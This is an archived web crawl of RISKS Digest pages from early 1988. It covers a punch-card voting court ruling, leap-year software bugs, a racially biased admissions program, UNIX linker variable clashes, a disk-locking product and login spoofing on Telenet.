article from the St. Louis Post-Dispatch of Saturday, 27 Feb 88:

  NEW RULING BY HUNGATE ALLOWS UNOFFICIAL RETURNS, OFFICIALS SAY
  (by Mark Schlinkmann, Regional Political Correspondent)
  
  Election officials in St. Louis say a federal court ruling Friday will allow
  business as usual -- computer tabulation of unofficial returns -- on the
  night of the state's presidential primary, March 8.  Friday's order, by US
  District Court Judge William L. Hungate, modifies his earlier decision
  against the Election Board in a case on voting rights filed by Michael V.
  Roberts, a city candidate who was defeated.  In his new order, Hungate
  limited the number of ballots that would have to be counted manually.
  
  The original order, made Dec. 22, touched off protests from Jerry B. Wamser,
  Election Board chairman. He had said that the order would require a manual
  count of all ballots -- a process that would take a week or longer.  Wamser
  also had said that the board would not run a computer tabulation on election
  night because it might lack legal authority to do so under Hungate's original
  ruling.  But board attorney Leo V. Garvin Jr. said Friday night that there no
  longer was any such concern as a result of Hungate's latest ruling.  Garvin
  declined further comment.
  
  In his suit, Roberts, who is black, said he lost the Democatic nomination for
  aldermanic president last year because the city's punch-card voting system
  discriminated against blacks.
  
  In his decision, Hungate did not overturn the results. But he found that the
  election board's failure to review ballots for which votes were not counted
  violated the federal Voting Rights Act.  Initially, Hungate ordered the board
  to count by hand all ballots validly cast by voters but not counted by
  computer tabulating equipment. In effect, that meant that all ballots would
  have to be counted by hand, election officials said.  [See note below -WM]
  But on Friday, Hungate ruled that a manual review would be necessary only if
  the total of "overvotes" and "undervotes" could conceivably make the
  difference between a candidate's winning or losing an election.
  
  An overvote is a ballot rejected because votes are punched for more than
  one candidate for a given office. An undervote is not counted because of
  improper punching or no punch at all.
  
  Hungate said his modified order applied to the primary on March 8 and to
  Tuesday's special election to pick a new 17th Ward alderman. Hungate
  added that the Election Board's plan for educating voters about the
  punch-card system was satisfactory for those two elections.
  
  Voters will be asked to check boxes on signature cards certifying that
  they have been offered instructions in the use of the punch cards.
  
NOTE: Personally, I don't see how having to manually review ballots which
were machine-rejected means that "all ballots have to be counted by hand".
The equipment could be programmed to count every ballot where there were
no problems, and just kick out any odd ones. Only those odd ones would
have to be manually processed. You could have done this decades ago with
EAM card-handling equipment, so I can't see why it should be difficult now!
  
Regards, Will Martin
  
</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.32.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.34.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-70</DOCNO>
<DOCOLDNO>IA012-000130-B024-380</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.34.html 128.240.150.127 19970217015826 text/html 25326
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:56:54 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 34</TITLE>
<LINK REL="Prev" HREF="/Risks/6.33.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.35.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.33.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.35.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 34</H1>
<H2>  Tuesday 1 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Leap-year madness 
</A>
<DD>
<A HREF="#subj1.1">
Charles Fineman via Chris Koenigsberg
</A><br>
<A HREF="#subj1.2">
 Michael Wagner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Risks of Leap Years and Dumb Digital Watches 
</A>
<DD>
<A HREF="#subj2.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computer Programmed in Predjudice 
</A>
<DD>
<A HREF="#subj3.1">
Brian Randell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Lousy Lazy UNIX Linkers 
</A>
<DD>
<A HREF="#subj4.1">
Joe Dellinger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Slippery slopes and probabilities 
</A>
<DD>
<A HREF="#subj5.1">
David Thomasson
</A><br>
<A HREF="#subj5.2">
 Barry Shein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Risks of Believing in Technology 
</A>
<DD>
<A HREF="#subj6.1">
Scott E. Preece
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Protection of system configuration...  
</A>
<DD>
<A HREF="#subj7.1">
James Ford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Stealing Passwords on Telenet 
</A>
<DD>
<A HREF="#subj8.1">
Christopher Jewell
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Fwd: Leap year madness
</A>
</H3>
<address>
Chris Koenigsberg 
&lt;<A HREF="mailto:ckk+@andrew.cmu.edu">
ckk+@andrew.cmu.edu
</A>&gt;
</address>
<i>
Mon, 29 Feb 88 18:18:59 -0500 (EST)
</i><PRE>

  Date: 29 Feb 88 14:21:36 EST
  From: Charles.Fineman@H.GP.CS.CMU.EDU
  Subject: Leap year madness
  To: BBoard.Maintainer@A.CS.CMU.EDU
  Attention: unix-forum bboard
  
  All you folks who created (or extended)  accounts using ADM today and
  used the default expiration date will most likely find that you cannot 
  use those accounts. The default expiration date is one year from the
  creation (extention) date which, in today's case, is a nonexistent date.
  Hence, the date interpreter chokes on it and it looks to ADM as if your
  account has expired.
  
  To resolve this, all you have to do is change the expiration date.
  
  		Charlie Fineman
  
  P.S. Now that's what I call a PHASE OF THE MOON error!!!
  
</PRE>
<HR><H3><A NAME="subj1.2">
Re: Leap year madness                     [In response to the above]
</A>
</H3>
<address>
  Michael Wagner +49 228 303 245 
&lt;<A HREF="mailto:WAGNER%DBNGMD21.BITNET@CUNYVM.CUNY.EDU">
WAGNER%DBNGMD21.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Tue, 01 Mar 88 15:56 CET
</i><PRE>

  Out of interest, I spent some time thinking about how many design
  mistakes are exposed by this example.  I find the following:

  1. Two different representations/algorithms for dates, (the 'date
     interpreter', whatever that is, and the 'account creator') with
     different handling for unusual cases.

  2. At least one representation allows illegal dates to be
     expressed i.e. the set of dates is not closed under the
     operation of addition (perhaps both allow this; not clear).

  3. The treatment of an illegal date *in the future* as an expired
     date i.e. in the past.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Risks of Leap Years and Dumb Digital Watches
</A>
</H3>
<address>
Mark Brader
&lt;<A HREF="mailto:msb@sq.com ">
msb@sq.com 
</A>&gt;
</address>
<i>
Mon, 29 Feb 88 19:53:55 EST
</i><PRE>

All right now -- how many people reading this *haven't yet realized* that
their watches have to be set back 1 day, because they went from February 28
directly to March 1?

Mark Brader, SoftQuad Inc., Toronto, utzoo!sq!msb, msb@sq.com

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 "COMPUTER PROGRAMMED IN PREDJUDICE"            [<A HREF="/Risks/4.27.html">RISKS-4.27</A> revisited]
</A>
</H3>
<address>
Brian Randell 
&lt;<A HREF="mailto:Brian_Randell%newcastle.ac.uk@NSS.Cs.Ucl.AC.UK">
Brian_Randell%newcastle.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Mon, 29 Feb 88 15:42:44 WET DST
</i><PRE>

Just over a year ago I reported in <A HREF="/Risks/4.27.html">RISKS-4.27</A> on the news stories here in the
UK about a discriminatory computerized student selection system. This has hit
the headlines again, now that the Commission for Racial Equality has issued a
report on the affair. Since the original posting attracted some interest, I
thought that the RISKS readership would like to see the attached news story,
from The Guardian of 25 February 1988 (reprinted without permission), since it
indicates how officialdom has, at last, reacted.


       COMPUTER PROGRAMMED IN PREDJUDICE
 
       Andrew Veitch on how a don built racial and sexual bias into selection 
       methods for a south London medical school
 
   The next college found breaking the race laws by discriminating against
black people will be prosecuted, senior Commission for Racial Equality
officials warned yesterday.
   After publication of the commission's report on race and sex discrimination
at the St. George's medical school, south London, a senior source said: "We
will make an example of the next one."
   The decision by the Education Secretary, Mr. Kenneth Baker, to instruct
universities and polytechnics to monitor the numbers of non-Caucasian students
is seen as a half measure. The commission's officials sat they need to know
who is rejected, and why. For that, they need a race question on university
application forms.
   St George's was caught, officials admit, only because the attitudes of its
selectors in years gone by were enshrined in a computer program: that program
deliberately downgraded non-Caucasians and women.
   Few, if any, other colleges operate computerized selection programmes, so
discrimination will be far harder, if not impossible, to prove.
   Three-quarters of St George's 2,500 applicants a year are rejected by the
academic assessors without being interviewed. About 70 per cent of those who
get interviews are offered places. So the first weeding-out is crucial.
   It is also time-consuming, which is why Dr Geoffrey Franglen, a former
vice-dean of St George's and himself an assessor, set out to develop a program
which, in his words, would "mimic the behaviour of the human assessors." The
result, by 1980, was a program which matched the assessors' decisions in 90-95
per cent of cases.
   The confidential report of the medical school's internal inquiry into the
affair, a copy of which has been obtained by the Guardian, shows how the
program worked, and who knew about it.
   Candidates were classified as Caucasian or non-Caucasian on the basis of
their names, or photographs if they were to hand. They were also classified by
sex.
   Being non-Caucasian, and or a women, resulted in a lower grade on the
interview scale: simply having a non-European name could take 15 points off an
applicant's score. Sex had less effect: on average, being female took no more
than three points off the score.
   That was enough, the Commission found in its investigation, to deprive 60
candidates a year of the interviews for which they should have qualified.
   The working of Dr Franglen's program was considered by an internal working
party in 1982 and again in 1985. The senior academics who constituted those
working parties which [sic] should have known - and probably did know - that
race and sex were used as factors in selecting candidates, says the St
George's inquiry team, which is headed by a solicitor, Mr Peter Gerrard.
   In fact, since the program mimicked the previous human assessors, it is
probable that discrimination occurred before the program was introduced, the
report says.
   Mr William Evans, the admissions officer, told the inquiry that he became
aware that the program discriminated against women and had a "bias against
non-Caucasians" in 1984.
   He had told the then academic registrar, Mr Jon Bursey. Mr Bursey said the
information should be kept confidential. He was particularly concerned lest
one of the consultants who took an interest in racial affairs, Dr Joe Collier,
should hear about it.
   Mr Bursey left without mentioning it to his successor, Dr Gareth Jones.
All went quiet until 1985 when a second working party considered the program.
   Dr Franglen was asked to describe its workings. He justified the weighting
it gave against non-Caucasians and women, and gave the working party the
impression that it had only a marginal effect on who was selected.
   Nevertheless, the working party recommended that the program be simplified
and rewritten. The school's academic board accepted this recommendation, but
nothing was done about it.
   The inquiry report specifically blames the then dean, Dr Richard West, for
"failing to ensure the task was carried out."
   By March 1986, Dr Jones, the academic registrar, was aware that the program
discriminated on grounds of race and sex. He did not take the matter to the
dean, he said, because he thought the dean already knew about it.
   In November 1986, Dr Collier discovered, by accident, that the program was
weighted. He wrote to the dean. Dr West asked Mr Evans to run a few cases
through the program. When he saw the effect, he immediately stopped its use."
 
</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Lousy Lazy UNIX Linkers
</A>
</H3>
<address>
Joe Dellinger 
&lt;<A HREF="mailto:joe@hanauma.STANFORD.EDU">
joe@hanauma.STANFORD.EDU
</A>&gt;
</address>
<i>
Mon, 29 Feb 88 18:27:44 pst
</i><PRE>

	This started with a very strange bug: Some C graphics software of
mine would unexpectedly shift the plot origin now and then while plotting.
Eventually it was discovered the the problem occurred whenever FORTRAN
formatted I/O was used. Finally it turned out that both our graphics
software library and the system FORTRAN I/O runtime library use a global
variable called "pc". In the graphics routines it is a structure pointer,
in the fortran routines it is an integer.
	Now, I had always thought that you can only actually declare a
global variable in one place... everywhere else it should be an external.
Otherwise how can you know something is amiss when you link together 2
different libraries that might happen to clash in their choice of global
variable names?
	Silly me... it turns out that UNIX linkers indeed WILL allow you
to declare something in more than one place, and indeed will then happily
assign them to the same memory location, even if they are of completely
incompatible types. And if you don't happen to have the source code for one
of the libraries that gets linked in, such as the FORTRAN runtime library,
THERE REALLY IS NO WAY YOU CAN KNOW AHEAD OF TIME what variable names might
get overlayed in this way...
	It makes me wonder how often this is happening and I DON'T catch
it, because the bugs it causes are not so "graphic". This seems to me to
be a very serious "RISK" of using the UNIX linker. Now I wonder if they
also used my favorite variable names, "ii", "jj", and "kk"...?

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
     Slippery slopes and probabilities
</A>
</H3>
<address>
        David Thomasson 
&lt;<A HREF="mailto:ST401405%BROWNVM.BITNET@MITVMA.MIT.EDU">
ST401405%BROWNVM.BITNET@MITVMA.MIT.EDU
</A>&gt;
</address>
<i>
Mon, 29 Feb 88 19:01:00 EST
</i><PRE>

&gt;[As has been noted frequently in RISKS, (1) probabilities are irrelevant
&gt;when it is YOUR life that is lost;...

This is true, but beside the point I was making. The writer who warned of the
risks of homing devices for finding stolen cars was clearly concerned about
public-policy considerations (and there is no risk of injury with the homing
device); the warning about the back-seat driver device could be about public
policy or individual prudence. My comment about slippery-slope arguments
concerns public policy, and I should have made that clear. In that context,
probabilities of risk are quite relevant. They are, in fact, also relevant to
personal decisions that involve risk to life or limb. The bracketed comment
above refers to life that is LOST. What we are concerned about here is life
and other values that are RISKED. And I see no way to assess risks without
appealing to probabilities.

</PRE>
<HR><H3><A NAME="subj5.2">
Re: Slippery slopes and the legitimatization of illegitimacy
</A>
</H3>
<address>
Barry Shein
&lt;<A HREF="mailto:bzs%bu-cs.bu.edu@bu-it.BU.EDU ">
bzs%bu-cs.bu.edu@bu-it.BU.EDU 
</A>&gt;
</address>
<i>
Tue, 1 Mar 88 02:38:40 EST
</i><PRE>

I have friend who believes firmly all probabilities are 50/50, either
things happen or they don't...

Basically the first argument was that picking some event E and saying
that because p(E)&gt;0 then we must worry (W) about E, this leads to:

	W = p(E)

This is the slippery slope argument, that all p is equal thus all W
must be equally considered.

The next argument by PGN says that there is a cost C which must be
considered, so we get:

	W = C*p(E)

and postulate there is some risk threshold T above which W seems
worthy of concern. The slippery slope argument remains possible, if we
assume p to be constant for all E then the C is irrelevant.  In fact,
the slippery slopist is forever inflating C in the listener's mind (or
relies upon a preconception of high C.)

Worse, there is a reversibility factor R (one major feature which
seems to distinguish humans from other animals is the former's ability
to carefully reverse its behavior.) Thus we might reformulate with
something like:

	W = C*p(E) - C*p(R)

or, the Worry of a Risk is the probability of one's fate corrected for
the cost less the probability of reversing that event also corrected
for the original cost.

But human behavior is not quite so simple! We must factor in the PS(t)
which of course is Pain and Suffering as a function of Time, and adjust
this for yet another cost, call it $. We thus arrive at the following
equation:

	W = C*p(E) - C*p(R) + $*PS(t)

This allows us to distinguish the $1000 phone bill which is cleared up
in one (hopefully inexpensive) call to their office versus one which
takes many calls. One could perhaps argue that these are two different
events and therefore should simply be factored into the first term
(C*p(E)), that is, the probability and cost of an easily solved phone
bill problem vs a difficult one should be distinguished.

I am quite certain that for many readers the risk of encountering such
an argument while casually perusing this digest has already exceeded
their threshold for suffering and reversibility is not possible, so I
will leave it at that.

	-Barry Shein, Boston University

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Risks of Believing in Technology (Re: <A HREF="/Risks/6.33.html">RISKS-6.33</A>)
</A>
</H3>
<address>
Scott E. Preece
&lt;<A HREF="mailto:preece%fang@gswd-vms.Gould.COM ">
preece%fang@gswd-vms.Gould.COM 
</A>&gt;
</address>
<i>
Tue, 1 Mar 88 09:06:50 CST
</i><PRE>

  From: Matt Bishop &lt;bishop%bear.dartmouth.edu@RELAY.CS.NET&gt; 
  &gt; Anyone who's seen a teenager struggle to multiply 314 and 512 by hand, then
  give up and reach for a calculator, knows just what I mean.

Well...yes and no.  There are any number of skills which our ancestors
possessed (and HAD to possess to survive) in which I have little or no
interest.  The definition of "basic skills" changes over time.  I would think
multiplication was still something everyone should know (if for no other
reason than that it helps build the notions you need for learning more
complicated things).  Driving (in the sense of guiding a horse pulling a
wagon) is no longer a "basic skill" -- do you care?  It hardly seems that an
occasionally heard collision warning is going to allow us to lose the ability
to avoid running into things.

I'd be interested in knowing if the FAA has any research on the number of
accidents avoided because of stall warnings and ground-approach warnings as
opposed to the number happening because the relied-upon warning failed to
happen.

scott preece  gould/csd - urbana  uucp:	ihnp4!uiucdcs!ccvaxa!preece

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
     Protection of system configuration...
</A>
</H3>
<address>
James Ford 
&lt;<A HREF="mailto:JFORD1%UA1VM.BITNET@CUNYVM.CUNY.EDU">
JFORD1%UA1VM.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Tue, 01 Mar 88 16:15:38 CST
</i><PRE>

  &gt; such as by making it impossible to delete, rename or amend files ......
  &gt; Does anyone know of software which would provide a simple solution to
  &gt; this problem?
  &gt; Tom Patterson, Department of Applied Mathematics &amp; Theroetical Physics

There is a program called PC-LOCK (*NOT* the PD version) which is made by
Johnson Computer Systems.  We have installed it on some hard disks here and
have had no problems at all.

     You have to boot with drive "C" and enter the proper password to gain
access.  There are 5 possible passwords you can set/use....1 administrator
password and 4 user passwords.  IF you try and boot from drive "A", you
cannot access drive "C".  Norton Adv, PC-Tools 4.11, Explorer and Ultra-
Utilities all return the phrase "Invalid drive...".

I'm not sure exactly what it does, but when you run FDISK, it shows the drive
as being a non-DOS disk.  Perhaps it moves the FATs somewhere else and
redirects DOS with its .SYS file.....

You can also turn off CTRL-BRK permantly, which will allow you to use your
favorite menu programs!!  Here is the address which was supplied with the
docs...

PC-LOCK, Johnson Computer Systems, 20 Dinwiddie Place, Newport News VA 23602

It has been *extremely* effective in stopping people from "borrowing" the
CAD programs placed on the drive.
                                                    James

NOTE1: If the program(s) being used allow you to SHELL to dos, you will need
       to examine the file, look for SHELL=C:\COMMAND.COM, and remove it.

NOTE2: All standard disclaimers.....

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Stealing Passwords on Telenet
</A>
</H3>
<address>
&lt;<A HREF="mailto:portal!cup.portal!chrisj@Sun.COM">
portal!cup.portal!chrisj@Sun.COM
</A>&gt;
</address>
<i>
Mon Feb 29 17:55:03 1988
</i><PRE>

This is summarized from a recent discussion in a non-Usenet conference
of the Portal system.

Several subscribers who use PC Pursuit to access Portal reported that
they got a message "CONNECT FROM ..." when dialing Telenet, followed by
someone at the other node simulating a login sequence, so that subscribers
would supply their name and password.  It appears that the problem is
known to the GTE Telenet folks, and that they are working on plugging the
security hole, but that they don't like to talk about it.  The problem is 
by no means limited to PC Pursuit: users of GTE's TeleMail system and other
services which ride on Telenet are also said to be vulnerable.  It appears
that GTE management is permitting its concern for the public image of its
network to increase the risk to its customers from this fundamentally
technical problem: besides plugging the leak, they should get the word out
to every customer, so as to reduce the risk in the mean time.  The CYA
response does nothing for my confidence in Telenet.

It is claimed that this is the work of people who are want only to
explore and map Telenet, and have no interest in doing anything harmful
with the information which they acquire, but I doubt that any comp.risks
reader wants to trust the benevolence of such crackers.

The insecurity of the UUCP mail network and Usenet is notorious (forged
articles etc), but we sometimes make the mistake of assuming that
commercial networks are technically and administratively immune to such
problems (other than those inherent in users' tendencies to pick
guessable passwords, of course).  This problem with Telenet is a reminder
that centrally managed commercial networks can be just as vulnerable as
the voluntary, anarchic world of UUCP.

In the particular case in point, anyone who gets that "CONNECT FROM"
message on Telenet should immediately log off: most of all, don't type
your password.  Also, if your password starts to echo when it should
be blind, disconnect immediately.  If you use a robot, such as a logon
script for a personal computer comm program, to access anything through
Telenet late at night when the rates are low and you are asleep, make
sure that the robot can recognize and respond to the CONNECT FROM
condition.  If your robot cannot protect you from this condition, DON'T
USE IT FOR UNATTENDED LOGON THROUGH TELENET.

The risks of a network in which a dial-up node can force a direct
connection with another dial-up node, without the explicit agreement of
the second node, appear so obvious as to make me wonder how the Telenet
folks could have made such as design decision.  Surely if node 1 asks 
to be connected to node 2, node 2 should get a dialog asking whether
or not it wants to accept the connection.

Comp.risks readers can perform a public service by notifying computer-
naive potential victims, such as company executives using TeleMail, about
the problem.  The risk of mailing, e.g., unencrypted corporate business
plans, to a masquerading recipient is clear.

Christopher Jewell  |  chrisj@cup.portal.com  |  sun!cup.portal.com!chrisj

    [This is an old war-horse that recurs every now and then, and is often
    thought of as a joke -- even though it can often be easily perpetrated. 
    It is the reason for the notion of the TRUSTED PATH in the National
    Computer Security Center's ORANGE BOOK set of criteria for trusted systems.
    Authentication is needed in BOTH directions -- the system would like
    some assurance that you are whom you claim to be, and you would like 
    the same about the system itself.  

    Once again, we need to remind our less experienced readers that the
    security/privacy/integrity issues are not easy, despite various press
    reports that (1) there is no problem, and (2) even if there were a 
    problem, it would be easy to fix.  Solutions range from not sharing
    anything to running a simple checking program.   But don't forget
    that we are dealing with people (on both sides of the fence), and
    that substantially changes the nature of the problems.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.33.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.35.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-71</DOCNO>
<DOCOLDNO>IA012-000130-B025-16</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.35.html 128.240.150.127 19970217015849 text/html 24524
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:57:13 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 35</TITLE>
<LINK REL="Prev" HREF="/Risks/6.34.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.36.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.34.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.36.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 35</H1>
<H2>  Wednesday 2 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Double pay?  Thank the bank.  
</A>
<DD>
<A HREF="#subj1.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  [Psychological Aspects of] Safe Systems 
</A>
<DD>
<A HREF="#subj2.1">
Nancy Leveson
</A><br>
<A HREF="#subj2.2">
 Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Disappearing skills 
</A>
<DD>
<A HREF="#subj3.1">
Len Popp
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Slippery slopes and the legitimatization of illegitimacy 
</A>
<DD>
<A HREF="#subj4.1">
Bob English
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Sins of RISKS and Risks of SINs 
</A>
<DD>
<A HREF="#subj5.1">
Robert Slade
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Dumb Digital Leap Year Madness    
</A>
<DD>
<A HREF="#subj6.1">
Mark Jackson
</A><br>
<A HREF="#subj6.2">
 Matthew Kruk
</A><br>
<A HREF="#subj6.3">
 Brint Cooper
</A><br>
<A HREF="#subj6.4">
 Robert Slade
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Virus security hole 
</A>
<DD>
<A HREF="#subj7.1">
Scot E. Wilcoxon
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Double pay?  Thank the bank.
</A>
</H3>
<address>
Dave Horsfall
&lt;<A HREF="mailto:munnari!stcns3.stc.oz.au!dave@uunet.UU.NET ">
munnari!stcns3.stc.oz.au!dave@uunet.UU.NET 
</A>&gt;
</address>
<i>
Fri, 26 Feb 88 12:10:06 est
</i><PRE>
Organization: Alcatel-STC Australia

From the Sydney Morning Herald, Friday 26th February:

  Double Pay?  Thank the bank.

  The Commonwealth Bank's computer gave many of its customers a raise
  yesterday -- in fact, it doubled their pay.  To make matters worse,
  as well as doubling the usual Thursday salary transfer, the computer
  doubled every other transaction.

  The bank's computer malfunctioned overnight and had to be controlled
  manually.  It finished up processing transactions twice.  Customers
  all over Australia with Keycard or cheque accounts found they had twice
  the amount debited or credited in their accounts.

  "These are the hazards of computing -- they are only limited by your
  imagination," said the bank's general manager, electronic data processing,
  Mr Peter Martin.

      [And I get only an occasional complaint that the KL mailer crashed in
      the middle of sending out RISKS, with the result being that you got
      TWO copies.  Sorry I can't do anything more exciting for you.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Psychological Aspects of Safe Systems           
</A>
</H3>
<address>
Nancy Leveson 
&lt;<A HREF="mailto:nancy%murphy.ics.uci.edu@ROME.ICS.UCI.EDU">
nancy%murphy.ics.uci.edu@ROME.ICS.UCI.EDU
</A>&gt;
</address>
<i>
Tue, 01 Mar 88 18:56:04 -0800
</i><PRE>

In Risks 6.34, Scott Preece asks:

